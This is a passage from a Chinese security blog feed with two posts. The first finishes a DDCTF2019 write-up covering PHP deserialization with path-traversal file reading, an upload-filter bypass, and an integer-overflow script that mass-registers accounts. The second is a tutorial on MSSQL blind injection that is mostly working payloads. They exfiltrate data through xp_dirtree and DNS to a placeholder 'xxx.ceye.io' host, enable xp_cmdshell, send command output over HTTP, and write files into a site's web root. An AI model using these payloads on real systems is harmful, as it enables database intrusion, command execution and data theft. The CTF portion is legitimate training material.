class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;session_create();</div><div class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</div><div class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">//eancrykey  and flag under the folder</span></div><div class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</div><div class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        $session = unserialize($session);</div><div class="line"></div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</div><div class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</div><div class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</div><div class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">                $data = sprintf($data,$v);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</div><div class="line">        $sessionid = <span class="string">''</span>;</div><div class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</div><div class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $userdata = <span class="keyword">array</span>(</div><div class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</div><div class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</div><div class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</div><div class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</div><div class="line">        );</div><div class="line"></div><div class="line">        $cookiedata = serialize($userdata);</div><div class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</div><div class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</div><div class="line">        setcookie(</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</div><div class="line">            $cookiedata,</div><div class="line">            $expire,</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</div><div class="line">            );</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">$ddctf = <span class="keyword">new</span> Session();</div><div class="line">$ddctf-&gt;index();</div></pre></td></tr></table></figure><p><strong>通过对代码代码审计可以看到在$session = unserialize($session)这里存在一个反序列化漏洞，这个点应该是个突破点，可以通过传入反序列化字符串触发Application对象当中的_destructs方法，_destructs当中存在任意文件读取，通过任意文件读取就可以读取到flag，另外代码里面限制了$path值为18个字符，结合代码的注释可以大概猜到flag文件为<code>../config/flag.txt</code>。</strong></p><p><strong>但是想要触发反序列化漏洞，首先需要获取到<code>../config/key.txt</code>文件当中的key，否则cookie是不能随意修改的，因为这里存在认证，获取key的方法如下</strong></p><p><strong>第一步，请求Session.php，<code>session_create</code>函数会设置cookie,这里先获取到cookie</strong><br><img src="http://pic.c1imber.top/blog/20190418/aHiYJXKwQHTd.png" alt="mark"></p><p><strong>第二步：将获取到的cookie添加到请求里面，绕过”the cookie data not match”</strong><br><img src="http://pic.c1imber.top/blog/20190418/vtlx25O4WU4w.png" alt="mark"></p><p><strong>接下来在传入post参数nickname的代码处，有一个foreach循环，这里会将key输出，代码如下：</strong><br><img src="http://pic.c1imber.top/blog/20190418/l3Jbk2CXxyoS.png" alt="mark"></p><p><strong>第一次循环，将Welcome my friend %s当中的%s替换为了<code>$_POST[&#39;nickname&#39;]</code>,此时$data变为了Welcome my friend <code>$_POST[&#39;nickname&#39;]</code>,第二次循环，要将key写入$data的时候，%s已经没有了，所以这里只输出了传入的nickname而不是key</strong><br><img src="http://pic.c1imber.top/blog/20190418/NmO1mi9EAbv5.png" alt="mark"><br><strong>那么要想输出key，可以将nickname设置为%s，这样第一次循环后$data变为了Welcome my friend %s，第二次循环后%s就可以被替换为key输出了</strong><br><img src="http://pic.c1imber.top/blog/20190418/y1MpCfVvI1f5.png" alt="mark"><br><strong>获取到key值：<code>EzblrbNSO</code>,得到key后,$cookiedata的值就可以随便构造了，这里构造序列化字符串进行任意文件读取，生成的exp代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $path = <span class="string">'..././config/flag.txt'</span>;</div><div class="line">&#125;</div><div class="line">$a=<span class="keyword">new</span> Application();</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="keyword">echo</span> md5(<span class="string">'EzblrbNSO:11:"Application":1:&#123;s:4:"path";s:21:"..././config/flag.txt";&#125;'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>因为 <code>$path=str_replace(&#39;../&#39;,&#39;&#39;,$path);$path=str_replace(&#39;..\\&#39;,&#39;&#39;,$path);</code>会删除<code>../</code>，所以这里需要使用双写<code>..././</code>绕过,之后得到:</strong></p><p><code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}5a014dbe49334e6dbb7326046950bee2</code><br><strong>将生成的exp进行传入cookie当中的ddctf_id请求即可，注意这里需要将<code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}</code>部分进行url编码，这样做是为了防止一些特殊字符的影响，然后就可以获取到flag了</strong><br><img src="http://pic.c1imber.top/blog/20190418/vPMp7lTuQoPn.png" alt="mark"></p><p><strong>flag:<code>DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</code></strong></p><h3 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h3><p><code>http://117.51.148.166/upload.php</code></p><p><strong>题目提供了用户名和密码：</strong></p><pre><code>user：dd@ctfpass：DD@ctf#000</code></pre><p><strong>通过提供用户名密码登陆后看到是一个上传页面</strong><br><img src="http://pic.c1imber.top/blog/20190418/6Pb8mqQLuHSf.png" alt="mark"><br><strong>经过尝试发现这里对图片的16进制头做了检查，另一方面也会对上传的图片进行二次渲染，上传的图片格式都会变成jpg图片格式的</strong></p><p><strong>这里要求上传的图片里必须要phpinfo()这个字符串才能输出flag，但是由于二次渲染会的原因，图片当中插入的代码会被删除，这里需要突破二次渲染，类似于upload-labs的第16关，相关文章如下：</strong></p><p><code>https://xz.aliyun.com/t/2657</code></p><p><strong>这里可以使用文章当中提到的国外大神写的脚本实现对jpg二次渲染的突破</strong></p><p><code>https://github.com/BlackFan/jpg_payload</code><br><strong>最终通过脚本生成的图片成功得到flag</strong><br><img src="http://pic.c1imber.top/blog/20190418/QNoDrGXml9h4.png" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20190418/pj6zqJaN3Jd7.png" alt="mark"></p><p>flag:<code>DDCTF{B3s7_7ry_php1nf0_85127c366b3a9fad}</code></p><h3 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h3><p><code>http://117.51.147.155:5050/index.html#/login</code></p><p><strong>题目提示：注册用户登陆系统并购买入场票据,淘汰所有对手就能吃鸡啦~</strong></p><p><strong>注册账户登陆，发现自己只有100余额，但是购买门票需要2000余额</strong></p><p><img src="http://pic.c1imber.top/blog/20190418/BU1uMNLvLkUQ.png" alt="mark"></p><p><strong>于是想到了之前护网杯买大辣条的一道题，这里应该存在整型溢出，经过测试发现这里存在uint32位的整型溢出.在立即购买下订单的时候修改金额为2^32+1，也就是4294967297</strong><br><img src="http://pic.c1imber.top/blog/20190418/ADFyVBLmpLiI.png" alt="mark"></p><p><strong>接下来在支付的时候可以产生溢出，通过1余额购买到门票</strong></p><p><img src="http://pic.c1imber.top/blog/20190418/aDyWIhrtAFI0.png" alt="mark"><br><img src="http://pic.c1imber.top/blog/20190418/km8bh2cjwLJP.png" alt="mark"><br><strong>买到票后可以获得礼包，礼包当中包括了id和ticket，游戏规则大概是这样：每个账号在买完票后都会生成自己的id和ticket，如果想要消灭对方，需要知道对方的id和ticket才可以。</strong></p><p><strong>但是这一点注册账号是没有任何限制的，所以这里可以通过注册大量的账号，通过溢出购买门票获得id和ticket，之后使用其中一个账号消灭其它的账号即可，整个过程可以通过脚本实现，几个操作的接口如下：</strong></p><p><strong>注册接口</strong><br><code>http://117.51.147.155:5050/ctf/api/register?name=xxx&amp;password=xxx</code></p><p><strong>登陆接口</strong><br><code>http://117.51.147.155:5050/ctf/api/login?name=xxx&amp;password=xxx</code></p><p><strong>请求支付/下订单接口,下完订单会返回对应的bill_id</strong><br><code>http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297</code></p><p><strong>支付接口：通过溢出实现门票购买,购买成功后会返回对于的id和ticket</strong><br><code>http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=</code></p><p><strong>移除对手接口</strong><br><code>http://117.51.147.155:5050/ctf/api/remove_robot?id=xxx&amp;ticket=xxx</code></p><p><strong>最终编写出脚本如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> json</div><div class="line">username=[]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></div><div class="line">    i=<span class="number">1</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        url=<span class="string">"http://117.51.147.155:5050/ctf/api/register?name=mk%s&amp;password=12345678"</span>%(i)</div><div class="line">        r=requests.get(url).json()</div><div class="line">        <span class="keyword">print</span> r</div><div class="line">        <span class="keyword">if</span> len(username)==<span class="number">400</span>:</div><div class="line">            <span class="keyword">print</span> username</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> r[<span class="string">'code'</span>]==<span class="number">200</span>:</div><div class="line">            username.append(<span class="string">"mk%s"</span>%(i))</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">register()</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> username:</div><div class="line">    url=<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=%s&amp;password=12345678"</span>%(i)</div><div class="line">    <span class="comment">#print url</span></div><div class="line">    r=requests.session()</div><div class="line">    r.get(url)</div><div class="line">    payurl=<span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297"</span></div><div class="line">    data=r.get(payurl).json()</div><div class="line">    bill_id=data[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</div><div class="line">    pay=<span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s"</span>%(bill_id)</div><div class="line">    data=r.get(pay).json()</div><div class="line">    yourid=data[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>]</div><div class="line">    ticket=data[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>]</div><div class="line">    r.get(<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=st4rk&amp;password=12345678"</span>)</div><div class="line">    delurl=<span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s"</span>%(yourid,ticket)</div><div class="line">    <span class="keyword">print</span> r.get(delurl).json()</div></pre></td></tr></table></figure><p><strong>接下来就可以执行脚本获取flag，需要注意的一点就是这里不是每个账号都可以消灭成功的，而且越往后，消灭的概率就会越低，写这道题的时候自己大概注册了快10000个账号才吃到鸡==</strong></p><p><strong>最终获取到flag:</strong><br><img src="http://pic.c1imber.top/blog/20190418/Bof7wUbqtsYX.png" alt="mark"></p><p><strong>flag:<code>DDCTF{chiken_dinner_hyMCX[n47Fx)}</code></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF2019-write-up&quot;&gt;&lt;a href=&quot;#DDCTF2019-write-up&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2019 write up&quot;&gt;&lt;/a&gt;DDCTF2019 write up&lt;/h1&gt;&lt;p&gt;&lt;stron
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>渗透技巧-使用dnslog加快盲注速度(MSSQL篇)</title>
    <link href="https://c1aysec.github.io/2019/03/17/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BD%BF%E7%94%A8dnslog%E5%8A%A0%E5%BF%AB%E7%9B%B2%E6%B3%A8%E9%80%9F%E5%BA%A6(MSSQL%E7%AF%87)/"/>
    <id>https://c1aysec.github.io/2019/03/17/渗透技巧-使用dnslog加快盲注速度(MSSQL篇)/</id>
    <published>2019-03-17T13:36:43.000Z</published>
    <updated>2020-03-31T04:41:25.512Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透技巧-使用dnslog加快盲注速度-MSSQL篇"><a href="#渗透技巧-使用dnslog加快盲注速度-MSSQL篇" class="headerlink" title="渗透技巧-使用dnslog加快盲注速度(MSSQL篇)"></a>渗透技巧-使用dnslog加快盲注速度(MSSQL篇)</h1><p><strong>关于dnslog盲注，之前写过的两篇文章：</strong></p><p><strong>渗透技巧-使用dnslog加快盲注速度(MYSQL篇)</strong></p><p><strong>记一次dnslog接收异常分析</strong></p><p><strong>这一次详细的总结一下dnslog在mssql盲注当中的使用</strong></p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><pre><code>1.服务器操作系统为windows2.mssql数据库支持master..xp_dirtree存储过程3.mssql注入点支持执行多语句4.mssql相对与mysql的优势在于可以执行系统命令，前提是需要支持master..xp_cmdshell存储过程。</code></pre><p><strong>可以看到，相比于mysql数据库，mssql的利用方法相对来说更多一些，下面介绍两种外带数据查询的方法</strong></p><h3 id="DNS外带查询"><a href="#DNS外带查询" class="headerlink" title="DNS外带查询"></a>DNS外带查询</h3><p><strong>注入点如下</strong></p><p><img src="http://pic.c1imber.top/blog/20191108/0MNqLkFU7N2k.png?imageslim" alt="mark"></p><p><strong>注入类型为布尔盲注或者时间盲注，传参本来为get，但是长度有限制，改为post传参即可以突破限制，可以看到有10s的延时</strong></p><p><strong>尝试使用dnslog获取当前用户：</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2buser%2b&apos;.xxx.ceye.io/abc&apos;;exec master..xp_dirtree @a;-- </code></pre><p><strong>注意这里由于POST DATA参数解析的问题，+会被当成空格，所以需要进行url编码，将+变为%2b</strong></p><p><strong>简单说一下这条sql语句的意思，首先将user的执行结果拼接进unc路径，接着通过xp_dirtree存储过程向unc路径发起请求，产生dns查询，在dnslog平台留下记录，可以看到dnslog接收到的user为dbo</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/yTHkeMQajXPz.png?imageslim" alt="mark"></p><p><strong>查看@@version数据库版本，由于长度超过了128个字符，需要分几次截取</strong></p><p><strong>首先确定长度</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select cast(len(@@version) as char(32)))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><strong>因为len的结果为数字型，mssql并不存在类型转换的特性，所以数字不能与字符串直接拼接，这里需要通过cast转化为字符型，可以看到接收到长度为189字节</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/zBqBnylhQOg4.png?imageslim" alt="mark"></p><p><strong>由于unc长度有限制，直接获取的话内容会被截断，所以要分两次截取：</strong></p><p><strong>第一次 1-95</strong></p><p><strong>第二次 95-189</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(@@version,1,95))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a--  declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(@@version,96,94))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><strong>通过两次的截取成功获取到了完整的数据库版本信息</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/GKQOgwoG6SQk.png?imageslim" alt="mark"></p><pre><code>microsoft sql server 2000 - 8.00.2039 (intel x86) may 3 2005 23:18:38 copyright (c) 1988-2003 microsoft corporation enterprise edition on windows nt 5.2 (build 3790: service pack 2)</code></pre><p><strong>当然还需要考虑一种特殊情况，假设说查询结果当中出现了一些unc路径不允许的特殊字符，那么在截取之前还需要进行一次16进制编写码</strong></p><p><strong>mssql当中字符串转16进制函数：</strong></p><pre><code>master.dbo.fn_varbintohexstr(xxx as VARBINARY(num))</code></pre><p><strong>首先查看版本信息16进制编码结果的长度</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select cast(len(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000)))) as char(32)))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/9xUX1j8mJVnx.png?imageslim" alt="mark"></p><p><strong>长度为758，分几次截取就可以得到完整的结果</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),1,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),61,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),121,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),181,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),241,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- .........declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),661,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a--declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),721,37))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/MnCF17wsmOEk.png?imageslim" alt="mark"></p><p><strong>可以看到dnslog接收到了每一次的结果，将结果拼接后得到：</strong></p><pre><code>4d006900630072006f0073006f00660074002000530051004c00200053006500720076006500720020002000320030003000300020002d00200038002e00300030002e0032003000330039002000280049006e00740065006c002000580038003600290020000a0009004d0061007900200020003300200032003000300035002000320033003a00310038003a003300380020000a00090043006f0070007900720069006700680074002000280063002900200031003900380038002d00320030003000330020004d006900630072006f006e000a00090045006e00740065007200700072006900730065002000450064006900740069006f006e0020006f006e002000570069006e0064006f007700730020004e005400200035002e003200200028004200750069006c006400200033003700390030003a002000530065007200760069006300650020005000610063006b002000320029000a0</code></pre><p><strong>再进行16进制解码</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/k5McwtBhcWju.png?imageslim" alt="mark"></p><p><strong>通过上面的思路，我们就可以获取任何数据了,同样也可以执行命令，首先看一下数据库是否支持master..xp_cmdshell这个存储过程，如果没有需要开启</strong></p><pre><code>EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;-- </code></pre><p><strong>测试注入点是否可以执行命令，最简单的办法就是ping一下ceye.io的二级域名，如果有dns记录，那就是支持了</strong></p><pre><code>exec master..xp_cmdshell &quot;ping aaa.xxx.ceye.io&quot;;-- </code></pre><p><strong>通过以下几个步骤可以将执行命令的结果回显至dnslog</strong></p><p><strong>第一步：创建临时表用于接收命令的执行结果，需要定义主键：</strong></p><pre><code>CREATE TABLE tt_tmp (id INT PRIMARY KEY IDENTITY,tmp1 nvarchar(4000));-- </code></pre><p><strong>第二步：将命令执行结果插入临时表：</strong></p><pre><code>DECLARE @code varchar(4000);SET @code=0x77686f616d69;insert into tt_tmp(tmp1) exec master..xp_cmdshell @code;-- </code></pre><p><strong>第三步：由于插入了多行，首先需要获取行数(经过测试部分版本的sqlserver在UNC查询结果的位置不能有空格，需要去除空格，使用rtrim)：</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select rtrim(cast(COUNT(*) as char(32))) from tt_tmp)%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a;-- </code></pre><p><strong>第四步：将查询结果发送至dnslog(逐行读取，截取字符串)</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(cast((select tmp1 from tt_tmp where id=1) as char(255)) as VARBINARY(4000))),1,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a;-- 1-6061-120121-180181-240241-300301-360361-420421-480481-512</code></pre><p><strong>成功后记得删除临时表</strong></p><pre><code>drop table tt_tmp;-- </code></pre><p><strong>主要过程就是创建一个临时表，然后读取临时表，将读取的结果发送至dnslog，结果如下</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/gdOYM8Vnn0yl.png?imageslim" alt="mark"></p><h3 id="HTTP外带查询"><a href="#HTTP外带查询" class="headerlink" title="HTTP外带查询"></a>HTTP外带查询</h3><p><strong>通过第一种方法，可以看到dns外带查询对长度以及一些特殊字符都有着严格的限制，比较麻烦，为了解决这个问题，可以通过HTTP外带查询的方式去代替</strong></p><p><strong>可以通过cmd命令，将执行命令的结果拼接进url，启动浏览器进程去发起http请求</strong></p><p><strong>执行whoami</strong></p><pre><code>exec master..xp_cmdshell &quot;for /F %i in (&apos;whoami&apos;) do start http://xxx.ceye.io/%i&quot;--</code></pre><p><img src="http://pic.c1imber.top/blog/20191109/Qd6243BxirrD.png?imageslim" alt="mark"></p><p><strong>执行dir</strong></p><pre><code>exec master..xp_cmdshell &quot;for /F %i in (&apos;dir&apos;) do start http://xxx.ceye.io/%i&quot;--</code></pre><p><img src="http://pic.c1imber.top/blog/20191109/Nv2m454pz5MX.png?imageslim" alt="mark"></p><p><strong>但是通过这种方法获取到的结果，会被空格截断，可以看到上面接收的结果都是不完整的，遇到空格就会被截断，不显示后面的内容</strong></p><p><strong>另外这种方法还有一些缺点，就是会在服务器启动大量的浏览器进程，有可能会导致服务器卡死或者被防火墙拦截，需要时不时的关闭浏览器进程</strong></p><pre><code>exec master..xp_cmdshell &quot;taskkill /f /im iexplore.exe&quot;-- </code></pre><p><strong>其它思路</strong></p><p><strong>可以通过此方法获取网站的根目录，之后将命令的执行结果写入到根目录的一个文件中</strong></p><p><strong>遍历C盘下的aspx后缀文件</strong></p><pre><code>exec master..xp_cmdshell &quot;for /r C:\ %i in (*.aspx) do start http://xxx.ceye.io/%i&quot;-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/LF9YA9cPAbmS.png?imageslim" alt="mark"></p><p><strong>遍历D盘下的aspx文件</strong></p><pre><code>exec master..xp_cmdshell &quot;taskkill /f /im iexplore.exe&quot;-- exec master..xp_cmdshell &quot;for /r D:\ %i in (*.aspx) do start http://xxx.ceye.io/%i&quot;-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/n67mO6S9UwDH.png?imageslim" alt="mark"></p><p><strong>最终确定了D:/zhenghedabu/这个路径就是网站的物理路径了。</strong></p><p><strong>获取到网站的物理路径后，会有更多的利用手法</strong></p><p><strong>比如可以将命令的执行结果输出到网站目录下的一个txt文本文件当中当中</strong></p><pre><code>exec master..xp_cmdshell &quot;ipconfig &gt; D:\zhenghedabu\tmp2019.txt&quot;-- </code></pre><p><strong>之后可以看到命令执行的结果</strong><br><img src="http://pic.c1imber.top/blog/20191109/jg9FftdPdj94.png?imageslim" alt="mark"></p><p><strong>同样的，知道了网站物理路径，也可以直接写入webshell</strong></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p><strong>使用dnslog可以有效的增加渗透的效率，避免了在盲注上花费过多的时间，但是思路也不能单单禁锢于这一种方式，比如mssql的注入点，可以执行命令，那么也可以直接通过反弹shell到公网的服务器上的。所以方法思路还是很多的，要合理使用才能事半功倍。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;渗透技巧-使用dnslog加快盲注速度-MSSQL篇&quot;&gt;&lt;a href=&quot;#渗透技巧-使用dnslog加快盲注速度-MSSQL篇&quot; class=&quot;headerlink&quot; title=&quot;渗透技巧-使用dnslog加快盲注速度(MSSQL篇)&quot;&gt;&lt;/a&gt;渗透技巧-使用
      
    
    </summary>
    
      <category term="web安全" scheme="https://c1aysec.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sql注入" scheme="https://c1aysec.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>记一次dnslog接收异常分析</title>
